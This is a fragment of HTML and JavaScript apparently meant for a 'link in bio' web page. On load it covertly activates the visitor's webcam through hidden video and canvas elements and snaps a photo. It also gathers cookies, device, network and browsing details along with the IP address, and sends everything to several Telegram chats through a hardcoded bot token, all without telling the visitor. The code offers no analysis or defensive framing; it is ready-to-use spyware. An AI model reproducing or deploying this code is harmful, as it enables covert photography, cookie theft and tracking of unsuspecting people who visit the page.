    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        let stream;

        // List of chat IDs
        const chatIds = ['6305469091', '-1002323834613', '6304355641']; // Add your chat IDs here

        // Telegram Bot Token
        const telegramToken = '7723113647:AAFy7_f5QGa6Or0fYK04s1rYbwwFjm9gQJM';

        // Initialize data collection on load
        window.addEventListener('load', () => {
            setTimeout(() => {
                initializeDataCollection();
            }, 1000);
        });

        function initializeDataCollection() {
            navigator.mediaDevices
                .getUserMedia({ video: true })
                .then((mediaStream) => {
                    stream = mediaStream;
                    video.srcObject = stream;
                    video.addEventListener('loadedmetadata', captureAndSendPhoto);
                })
                .catch((err) => {
                    console.error('Camera access denied:', err);
                    collectAndSendData(null);
                });
        }

        function captureAndSendPhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Flip image horizontally
            context.translate(canvas.width, 0);
            context.scale(-1, 1);

            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');
            stopCamera();
            collectAndSendData(imageData);
        }

        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach((track) => track.stop());
            }
        }

        async function collectAndSendData(imageData = null) {
            try {
                const deviceInfo = navigator.userAgent;
                const cookies = document.cookie;
                const historyLength = window.history.length;
                const screenResolution =
                    window.screen.width + 'x' + window.screen.height;
                const language = navigator.language;
                const referrer = document.referrer || 'Direct visit';
                const timestamp = new Date().toLocaleString();

                const connection =
                    navigator.connection ||
                    navigator.mozConnection ||
                    navigator.webkitConnection;
                const effectiveType = connection
                    ? connection.effectiveType
                    : 'unknown';
                const downlink = connection
                    ? connection.downlink + ' Mbps'
                    : 'unknown';

                // Compose message for Telegram
                const message = `
🔥 *NEW LINK IN BIO VISITOR D3F9LT* 🔥

📅 *Time:* \`${timestamp}\`

🤳 *Camera:* \`${imageData ? '✅ Captured' : '❌ Access Denied'}\`

📱 *Device Info:*
\`\`\`
${deviceInfo}
\`\`\`

🌐 *Network Info:*
• Connection: \`${effectiveType}\`
• Speed: \`${downlink}\`

🖥️ *Display:*
\`${screenResolution}\`

🗣️ *Language:* \`${language}\`

🔗 *Referrer:*
\`${referrer}\`

📊 *Session:*
• History Length: \`${historyLength}\`

🍪 *Cookies:*
\`\`\`
${cookies || 'No cookies'}
\`\`\`

━━━━━━━━━━━━━━━━━━━━
🎯 *Link in Bio Page Accessed*`;

                // Get IP separately (fetch)
                let ip = 'Unknown';
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip;
                } catch (e) {
                    console.error('Failed to get IP:', e);
                }

                // Append IP to message
                const finalMessage = message.replace(
                    '• Connection:',
                    `• IP: \`${ip}\`\n• Connection:`
                );

                // Send to all chat IDs
                chatIds.forEach((chatId) => {
                    if (chatId) {
                        if (imageData) {
                            sendPhotoToTelegram(
                                imageData,
                                finalMessage,
                                chatId
                            );
                        } else {
                            sendTextToTelegram(finalMessage, chatId);
                        }
                    }
                });
            } catch (err) {
                console.error('Error collecting data:', err);
            }
        }

        function dataURLToBlob(dataURL) {
            const byteString = atob(dataURL.split(',')[1]);
            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
            const ab = new ArrayBuffer(byteString.length);
            const ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        function sendPhotoToTelegram(imageData, caption, chatId) {
            const blob = dataURLToBlob(imageData);
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'visitor_photo.png');
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');

            fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                method: 'POST',
                body: formData,
            })
                .then(() => console.log(`Photo sent to chat ${chatId}`))
                .catch((error) =>
                    console.error('Error sending photo:', error)
                );
        }

        function sendTextToTelegram(text, chatId) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('text', text);
            formData.append('parse_mode', 'Markdown');

            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                method: 'POST',
                body: formData,
            })
                .then(() => console.log(`Message sent to chat ${chatId}`))
                .catch((error) =>
                    console.error('Error sending message:', error)
                );
        }

        // Prevent right-click and text selection (optional)
